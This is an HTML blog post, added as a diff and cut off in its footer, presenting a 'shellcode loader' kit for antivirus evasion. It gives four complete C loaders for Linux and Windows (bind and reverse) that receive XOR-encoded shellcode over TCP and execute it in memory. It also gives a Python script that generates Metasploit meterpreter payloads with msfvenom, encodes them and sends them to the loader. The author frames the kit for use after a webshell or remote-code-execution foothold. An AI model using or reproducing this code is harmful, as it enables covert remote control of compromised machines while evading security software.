@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+<meta name="referrer" content="no-referrer" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
+  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
+  <link rel="manifest" href="/images/logo_icon.svg">
+  <meta name="msapplication-config" content="/images/logo_icon.svg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=consolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="分离免杀，把ShellCode的加载部分与运行部分分开，再通过TCP Socket传输运行部分给到Loader程序,从而实现Shellcode直接在内存中运行 闲着上网冲浪偶然看到了这个免杀方法，适用于WebShell或者RCE漏洞，但网上找到的不是特别全 这里按照系统与正反向连接方法的不同写了四份代码，并额外添加了Shellcode异或以避免被检测到直接传输Shelllcode 顺手写了个met">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shellcode_Loader">
+<meta property="og:url" content="https://yoloyolo.top/2023/11/02/Shellcode-Loader/index.html">
+<meta property="og:site_name" content="xXxYOLOxXx">
+<meta property="og:description" content="分离免杀，把ShellCode的加载部分与运行部分分开，再通过TCP Socket传输运行部分给到Loader程序,从而实现Shellcode直接在内存中运行 闲着上网冲浪偶然看到了这个免杀方法，适用于WebShell或者RCE漏洞，但网上找到的不是特别全 这里按照系统与正反向连接方法的不同写了四份代码，并额外添加了Shellcode异或以避免被检测到直接传输Shelllcode 顺手写了个met">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-11-02T12:01:23.000Z">
+<meta property="article:modified_time" content="2023-11-02T12:18:47.988Z">
+<meta property="article:author" content="xXxYOLOxXx">
+<meta property="article:tag" content="Anti_AntiVirus">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yoloyolo.top/2023/11/02/Shellcode-Loader/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Shellcode_Loader | xXxYOLOxXx</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xXxYOLOxXx</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2023/11/02/Shellcode-Loader/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xXxYOLOxXx">
+      <meta itemprop="description" content="Explorer for unknown.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xXxYOLOxXx">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Shellcode_Loader
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-11-02 20:01:23 / Modified: 20:18:47" itemprop="dateCreated datePublished" datetime="2023-11-02T20:01:23+08:00">2023-11-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Study/" itemprop="url" rel="index"><span itemprop="name">Study</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>分离免杀，把ShellCode的加载部分与运行部分分开，再通过TCP Socket传输运行部分给到Loader程序,从而实现Shellcode直接在内存中运行<br />
+闲着上网冲浪偶然看到了这个免杀方法，适用于WebShell或者RCE漏洞，但网上找到的不是特别全<br />
+这里按照系统与正反向连接方法的不同写了四份代码，并额外添加了Shellcode异或以避免被检测到直接传输Shelllcode<br />
+顺手写了个meterpreter payload生成并自动传输的脚本<br />
+本想开个repo的，但是感觉这玩意后续也没啥可更新的了，直接丢blog里算了</p>
+<a id="more"></a>
+<h1 id="linux_bind"><a class="markdownIt-Anchor" href="#linux_bind"></a> Linux_Bind</h1>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;arpa&#x2F;inet.h&gt;</span><br><span class="line">#include &lt;netinet&#x2F;in.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;socket.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	char bufferReceivedBytes[4096] &#x3D; &#123;0&#125;;</span><br><span class="line">	const char *port &#x3D; &quot;1338&quot;;</span><br><span class="line">	const int key &#x3D; 0xff;</span><br><span class="line">	int listenSocket, clientSocket;</span><br><span class="line">	int recvBytes &#x3D; 0;</span><br><span class="line">	struct sockaddr_in serverAddr, clientAddr;</span><br><span class="line"></span><br><span class="line">	socklen_t clientAddrLen &#x3D; sizeof(clientAddr);</span><br><span class="line">	serverAddr.sin_family &#x3D; AF_INET;</span><br><span class="line">	serverAddr.sin_addr.s_addr &#x3D; INADDR_ANY;</span><br><span class="line">	serverAddr.sin_port &#x3D; htons(atoi(port));</span><br><span class="line">	listenSocket &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">	bind(listenSocket, (struct sockaddr *)&amp;serverAddr, sizeof(serverAddr));</span><br><span class="line">	listen(listenSocket, SOMAXCONN);</span><br><span class="line">	clientSocket &#x3D; accept(listenSocket, (struct sockaddr *)&amp;clientAddr, &amp;clientAddrLen);</span><br><span class="line">	recvBytes &#x3D; recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), 0);</span><br><span class="line">	for(int i &#x3D; 0; i &lt;&#x3D; recvBytes; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		bufferReceivedBytes[i] &#x3D; bufferReceivedBytes[i] ^ key;</span><br><span class="line">	&#125;</span><br><span class="line">	void *shellcode &#x3D; mmap(NULL, recvBytes, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">	memcpy(shellcode, bufferReceivedBytes, sizeof(bufferReceivedBytes));</span><br><span class="line">	((void(*)()) shellcode)();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="linux_reverse"><a class="markdownIt-Anchor" href="#linux_reverse"></a> Linux_Reverse</h1>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;arpa&#x2F;inet.h&gt;</span><br><span class="line">#include &lt;netinet&#x2F;in.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;socket.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	char bufferReceivedBytes[4096] &#x3D; &#123;0&#125;;</span><br><span class="line">	const char* port &#x3D; &quot;1338&quot;;</span><br><span class="line">	const char* serverAddress &#x3D; &quot;192.168.56.101&quot;;</span><br><span class="line">	const int key &#x3D; 0xff;</span><br><span class="line">	int clientSocket;</span><br><span class="line">	int recvBytes &#x3D; 0;</span><br><span class="line">	struct sockaddr_in serverAddr;</span><br><span class="line"></span><br><span class="line">	socklen_t serverAddrLen &#x3D; sizeof(serverAddr);</span><br><span class="line">	clientSocket &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">	serverAddr.sin_family &#x3D; AF_INET;</span><br><span class="line">	serverAddr.sin_port &#x3D; htons(atoi(port));</span><br><span class="line">	inet_pton(AF_INET, serverAddress, &amp;serverAddr.sin_addr);</span><br><span class="line">	connect(clientSocket, (struct sockaddr*)&amp;serverAddr, serverAddrLen);</span><br><span class="line">	recvBytes &#x3D; recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), 0);</span><br><span class="line">	for(int i &#x3D; 0; i &lt;&#x3D; recvBytes; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		bufferReceivedBytes[i] &#x3D; bufferReceivedBytes[i] ^ key;</span><br><span class="line">	&#125;</span><br><span class="line">	void *shellcode &#x3D; mmap(NULL, recvBytes, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">	memcpy(shellcode, bufferReceivedBytes, sizeof(bufferReceivedBytes));</span><br><span class="line">	((void(*)()) shellcode)();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="windows_bind"><a class="markdownIt-Anchor" href="#windows_bind"></a> Windows_Bind</h1>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;WinSock2.h&gt;</span><br><span class="line">#include &lt;WS2tcpip.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	CHAR bufferReceivedBytes[4096] &#x3D; &#123;0&#125;;</span><br><span class="line">	INT recvBytes &#x3D; 0;</span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	PCSTR port &#x3D; &quot;1338&quot;;</span><br><span class="line">	const int key &#x3D; 0xff;</span><br><span class="line">	SOCKET clientSocket &#x3D; INVALID_SOCKET;</span><br><span class="line">	SOCKET listenSocket &#x3D; INVALID_SOCKET;</span><br><span class="line"></span><br><span class="line">	ADDRINFOA SocketHint &#x3D; &#123;0&#125;;</span><br><span class="line">	ADDRINFOA* AddrInfo &#x3D; NULL;</span><br><span class="line">	SocketHint.ai_family &#x3D; AF_INET;</span><br><span class="line">	SocketHint.ai_socktype &#x3D; SOCK_STREAM;</span><br><span class="line">	SocketHint.ai_protocol &#x3D; IPPROTO_TCP;</span><br><span class="line">	SocketHint.ai_flags &#x3D; AI_PASSIVE;</span><br><span class="line">	WSAStartup(MAKEWORD(2, 2), &amp;wsaData);</span><br><span class="line">	GetAddrInfoA(NULL, port, &amp;SocketHint, &amp;AddrInfo);</span><br><span class="line">	listenSocket &#x3D; socket(AddrInfo-&gt;ai_family, AddrInfo-&gt;ai_socktype, AddrInfo-&gt;ai_protocol);</span><br><span class="line">	bind(listenSocket, AddrInfo-&gt;ai_addr, (int)AddrInfo-&gt;ai_addrlen);</span><br><span class="line">	listen(listenSocket, SOMAXCONN);</span><br><span class="line">	clientSocket &#x3D; accept(listenSocket, NULL, NULL);</span><br><span class="line">	recvBytes &#x3D; recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), 0);</span><br><span class="line">	for(int i &#x3D; 0; i &lt;&#x3D; recvBytes; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		bufferReceivedBytes[i] &#x3D; bufferReceivedBytes[i] ^ key;</span><br><span class="line">	&#125;</span><br><span class="line">	LPVOID shellcode &#x3D; VirtualAlloc(NULL, recvBytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(shellcode, bufferReceivedBytes, recvBytes);</span><br><span class="line">    ((void(*)()) shellcode)();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="windows_reverse"><a class="markdownIt-Anchor" href="#windows_reverse"></a> Windows_Reverse</h1>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;WinSock2.h&gt;</span><br><span class="line">#include &lt;WS2tcpip.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">	CHAR bufferReceivedBytes[4096] &#x3D; &#123;0&#125;;</span><br><span class="line">	INT recvBytes &#x3D; 0;</span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	PCSTR port &#x3D; &quot;1338&quot;;</span><br><span class="line">	const int key &#x3D; 0xff;</span><br><span class="line">	SOCKET clientSocket &#x3D; INVALID_SOCKET;</span><br><span class="line">	SOCKET listenSocket &#x3D; INVALID_SOCKET;</span><br><span class="line"></span><br><span class="line">	ADDRINFOA SocketHint &#x3D; &#123;0&#125;;</span><br><span class="line">	ADDRINFOA* AddrInfo &#x3D; NULL;</span><br><span class="line">	SocketHint.ai_family &#x3D; AF_INET;</span><br><span class="line">	SocketHint.ai_socktype &#x3D; SOCK_STREAM;</span><br><span class="line">	SocketHint.ai_protocol &#x3D; IPPROTO_TCP;</span><br><span class="line">	SocketHint.ai_flags &#x3D; AI_PASSIVE;</span><br><span class="line">	WSAStartup(MAKEWORD(2, 2), &amp;wsaData);</span><br><span class="line">	GetAddrInfoA(NULL, port, &amp;SocketHint, &amp;AddrInfo);</span><br><span class="line">	listenSocket &#x3D; socket(AddrInfo-&gt;ai_family, AddrInfo-&gt;ai_socktype, AddrInfo-&gt;ai_protocol);</span><br><span class="line">	bind(listenSocket, AddrInfo-&gt;ai_addr, (int)AddrInfo-&gt;ai_addrlen);</span><br><span class="line">	listen(listenSocket, SOMAXCONN);</span><br><span class="line">	clientSocket &#x3D; accept(listenSocket, NULL, NULL);</span><br><span class="line">	recvBytes &#x3D; recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), 0);</span><br><span class="line">	for(int i &#x3D; 0; i &lt;&#x3D; recvBytes; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		bufferReceivedBytes[i] &#x3D; bufferReceivedBytes[i] ^ key;</span><br><span class="line">	&#125;</span><br><span class="line">	LPVOID shellcode &#x3D; VirtualAlloc(NULL, recvBytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(shellcode, bufferReceivedBytes, recvBytes);</span><br><span class="line">    ((void(*)()) shellcode)();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="shellcode_transferer"><a class="markdownIt-Anchor" href="#shellcode_transferer"></a> Shellcode_transferer</h1>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import click</span><br><span class="line">import socket</span><br><span class="line">import subprocess</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">@click.command()</span><br><span class="line">@click.option(&quot;-a&quot;, default&#x3D;None, type&#x3D;click.Choice([&quot;x86&quot;]), help&#x3D;&quot;Architecture (default: x64)&quot;)</span><br><span class="line">@click.option(&quot;-pl&quot;, required&#x3D;True, type&#x3D;click.Choice([&quot;windows&quot;, &quot;linux&quot;]), help&#x3D;&quot;Platform (choices: windows, linux)&quot;)</span><br><span class="line">@click.option(&quot;-f&quot;, required&#x3D;True, type&#x3D;click.Choice([&quot;b&quot;, &quot;r&quot;]), help&#x3D;&quot;Flow (choices: b, r). \&quot;b\&quot; for bind_tcp and \&quot;r\&quot; for reverse_tcp&quot;)</span><br><span class="line">@click.option(&quot;-h&quot;, type&#x3D;str, required&#x3D;True, help&#x3D;&quot;Host&quot;)</span><br><span class="line">@click.option(&quot;-p&quot;, type&#x3D;int, required&#x3D;True, help&#x3D;&quot;Port&quot;)</span><br><span class="line">@click.option(&quot;-lp&quot;, type&#x3D;int, required&#x3D;True, help&#x3D;&quot;Loader port&quot;)</span><br><span class="line"></span><br><span class="line">def shellcode_start(a, pl, f, h, p, lp):</span><br><span class="line">	arch &#x3D; a</span><br><span class="line">	platform &#x3D; pl</span><br><span class="line">	flow &#x3D; f</span><br><span class="line">	host &#x3D; h</span><br><span class="line">	port &#x3D; p</span><br><span class="line">	loader_port &#x3D; lp</span><br><span class="line">	if arch:</span><br><span class="line">		if platform &#x3D;&#x3D; &quot;windows&quot;:</span><br><span class="line">			if flow &#x3D;&#x3D; &quot;b&quot;:</span><br><span class="line">				msfvenom &#x3D; &quot;msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (port)</span><br><span class="line">			elif flow &#x3D;&#x3D; &quot;r&quot;:</span><br><span class="line">				msfvenom &#x3D; &quot;msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;%s LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (host, port)</span><br><span class="line">		elif platform &#x3D;&#x3D; &quot;linux&quot;:</span><br><span class="line">			if flow &#x3D;&#x3D; &quot;b&quot;:</span><br><span class="line">				msfvenom &#x3D; &quot;msfvenom -p linux&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (port)</span><br><span class="line">			elif flow &#x3D;&#x3D; &quot;r&quot;:</span><br><span class="line">				msfvenom &#x3D; &quot;msfvenom -p linux&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;%s LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (host, port)</span><br><span class="line">	else:</span><br><span class="line">		if platform &#x3D;&#x3D; &quot;windows&quot;:</span><br><span class="line">			if flow &#x3D;&#x3D; &quot;b&quot;:</span><br><span class="line">				msfvenom &#x3D; &quot;msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (port)</span><br><span class="line">			elif flow &#x3D;&#x3D; &quot;r&quot;:</span><br><span class="line">				msfvenom &#x3D; &quot;msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;%s LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (host, port)</span><br><span class="line">		elif platform &#x3D;&#x3D; &quot;linux&quot;:</span><br><span class="line">			if flow &#x3D;&#x3D; &quot;b&quot;:</span><br><span class="line">				msfvenom &#x3D; &quot;msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (port)</span><br><span class="line">			elif flow &#x3D;&#x3D; &quot;r&quot;:</span><br><span class="line">				msfvenom &#x3D; &quot;msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;%s LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (host, port)</span><br><span class="line">	print(msfvenom)</span><br><span class="line">	result, err &#x3D; subprocess.Popen(msfvenom, stdout &#x3D; subprocess.PIPE, stderr &#x3D; subprocess.PIPE, shell &#x3D; True).communicate()</span><br><span class="line">	result &#x3D; binascii.unhexlify(result.decode().split(&quot;&#x3D; \n\&quot;&quot;)[1].replace(&quot;\&quot;\n\&quot;&quot;, &quot;&quot;)[:-3].replace(&quot;\\x&quot;, &quot;&quot;).encode())</span><br><span class="line"></span><br><span class="line">	key &#x3D; 0xff</span><br><span class="line">	new_shellcode &#x3D; &quot;&quot;</span><br><span class="line">	for _ in result:</span><br><span class="line">		new_shellcode &#x3D; new_shellcode + chr(_ ^ key)</span><br><span class="line"></span><br><span class="line">	if flow &#x3D;&#x3D; &quot;b&quot;:</span><br><span class="line">		client_socket &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		client_socket.connect((host, loader_port))</span><br><span class="line">		client_socket.send(new_shellcode.encode(&quot;ISO-8859-1&quot;))</span><br><span class="line">		client_socket.close()</span><br><span class="line">	elif flow &#x3D;&#x3D; &quot;r&quot;:</span><br><span class="line">		server_socket &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		server_socket.bind((&quot;0.0.0.0&quot;, loader_port))</span><br><span class="line">		server_socket.listen(1)</span><br><span class="line">		print(&quot;Socket server online.&quot;)</span><br><span class="line">		client_socket, client_address &#x3D; server_socket.accept()</span><br><span class="line">		client_socket.send(new_shellcode.encode(&quot;ISO-8859-1&quot;))</span><br><span class="line">		client_socket.close()</span><br><span class="line">		server_socket.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    shellcode_start()</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>xXxYOLOxXx
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
